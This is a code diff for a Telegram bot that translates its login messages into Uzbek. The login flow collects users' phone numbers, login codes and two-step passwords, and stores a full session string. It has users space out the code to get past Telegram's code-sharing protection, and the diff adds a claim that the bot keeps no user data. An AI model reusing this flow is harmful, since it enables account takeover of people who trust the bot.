@@ -64,12 +64,12 @@ async def clear_db(client, message):
         pass
 
     if files_deleted:
-        await message.reply("✅ Your session data and files have been cleared from memory and disk.")
+        await message.reply("✅ Sizning ma'lumotlaringiz va fayllaringiz xotiradan o'chirildi.")
     else:
-        await message.reply("✅ Logged out with flag -m")
+        await message.reply("⚠️ Siz tizimga hali kirmagansiz.")
         
     
-@app.on_message(filters.command("login"))
+@app.on_message(filters.command("kirish"))
 async def generate_session(_, message):
     joined = await subscribe(_, message)
     if joined == 1:
@@ -81,51 +81,51 @@ async def generate_session(_, message):
         
     user_id = message.chat.id   
     
-    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
+    number = await _.ask(user_id, 'Iltimos, telefon raqamingizni mamlakat kodi bilan birga kiriting. \nMasalan: +998901234567', filters=filters.text)   
     phone_number = number.text
     try:
-        await message.reply("📲 Sending OTP...")
+        await message.reply("📲 Kod yuborilmoqda...")
         client = Client(f"session_{user_id}", api_id, api_hash)
         
         await client.connect()
     except Exception as e:
-        await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
+        await message.reply(f"❌ Kod yuborishda xatolik {e}. Iltimos keyinroq qayta urinib ko‘ring.")
     try:
         code = await client.send_code(phone_number)
     except ApiIdInvalid:
-        await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
+        await message.reply('❌ API ID va API HASH kombinatsiyasi noto‘g‘ri. Iltimos, boshidan qayta boshlang.')
         return
     except PhoneNumberInvalid:
-        await message.reply('❌ Invalid phone number. Please restart the session.')
+        await message.reply("❌ Noto'g'ri raqam. Iltimos, boshidan qayta boshlang.")
         return
     try:
-        otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
+        otp_code = await _.ask(user_id, "Telegramdan sizga kod kelganini tekshiring. Kelgan taqdirda, uni quyidagi formatda kiriting: \nMasalan sizga `12345` raqamli kod keldi, siz ularni joy tashlab kiriting `1 2 3 4 5`.", filters=filters.text, timeout=600)
     except TimeoutError:
-        await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
+        await message.reply('⏰ 10 daqiqalik vaqt chegarasidan oshib ketdi. Iltimos, sessiyani qayta ishga tushiring.')
         return
     phone_code = otp_code.text.replace(" ", "")
     try:
         await client.sign_in(phone_number, code.phone_code_hash, phone_code)
                 
     except PhoneCodeInvalid:
-        await message.reply('❌ Invalid OTP. Please restart the session.')
+        await message.reply('❌ Yaroqsiz kod. Iltimos, boshidan qayta boshlang.')
         return
     except PhoneCodeExpired:
-        await message.reply('❌ Expired OTP. Please restart the session.')
+        await message.reply('❌ Eskirgan kod. Iltimos, boshidan qayta boshlang.')
         return
     except SessionPasswordNeeded:
         try:
-            two_step_msg = await _.ask(user_id, 'Your account has two-step verification enabled. Please enter your password.', filters=filters.text, timeout=300)
+            two_step_msg = await _.ask(user_id, 'Hisobingizda ikki bosqichli tasdiqlash yoqilgan. Iltimos, parolingizni kiriting. (jarayon xavfsiz, biz malumotlaringizga egalik qilmaymiz!)', filters=filters.text, timeout=300)
         except TimeoutError:
-            await message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
+            await message.reply('⏰ 5 daqiqalik vaqt chegarasidan oshib ketdi. Iltimos, boshidan qayta boshlang.')
             return
         try:
             password = two_step_msg.text
             await client.check_password(password=password)
         except PasswordHashInvalid:
-            await two_step_msg.reply('❌ Invalid password. Please restart the session.')
+            await two_step_msg.reply('❌ Parolingizni xato kiritdingiz. Iltimos, boshidan qayta boshlang.')
             return
     string_session = await client.export_session_string()
     await db.set_session(user_id, string_session)
     await client.disconnect()
-    await otp_code.reply("✅ Login successful!")
+    await otp_code.reply("✅ Muvaffaqqiyatli kirish amalga oshdi!")
